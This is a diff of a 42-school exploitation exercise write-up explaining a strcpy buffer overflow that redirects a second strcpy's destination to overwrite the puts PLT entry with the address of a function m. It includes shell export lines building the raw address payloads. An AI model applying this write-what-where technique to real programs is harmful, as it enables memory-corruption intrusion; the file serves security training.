@@ -6,17 +6,19 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:32 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:52:55 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/04 20:47:56 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
+The programs uses strcpy to store the strings
+An overflow in the first argument overwrites the dst argument of the second strcpy
+If we use that overflow to write a new pointer in dst,
+	we can write the second argument anywhere
 
-export A=`echo -e "\x54\x84\x04\x08"`
-export B=`echo -e "\x54\x84\x04\x08"`
+We change the pointer to puts to m
 
 A = where I want to write => 0x8049928 (puts plt)
 B = what I want to write => 0x080484f4 (m)
-
 
 export A=`echo -e "\x28\x99\x04\x08"`
 export B=`echo -e "\xf4\x84\x04\x08"`
